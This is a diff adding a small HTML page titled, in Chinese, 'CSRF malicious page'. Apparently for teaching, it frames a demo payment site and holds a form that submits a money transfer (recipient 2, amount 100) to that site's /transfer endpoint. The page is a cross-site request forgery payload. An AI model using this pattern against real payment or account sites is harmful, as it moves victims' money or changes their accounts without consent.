@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>CSRF 恶意页面</title>
+</head>
+<body>
+  <h1>诱导转账网站</h1>
+  <iframe width='600' height='320' src='http://pay.csrf.com:3000'></iframe>
+
+  <form action="http://pay.csrf.com:3000/transfer">
+    <p>
+      <label>转账目标ID</label>
+      <input type="text" name="to" value="2" />
+    </p>
+    <p>
+      <label>转账金额</label>
+      <input type="text" name="amount" value="100" />
+    </p>
+    <button type="submit">提交</button>
+  </form>
+</body>
+</html>
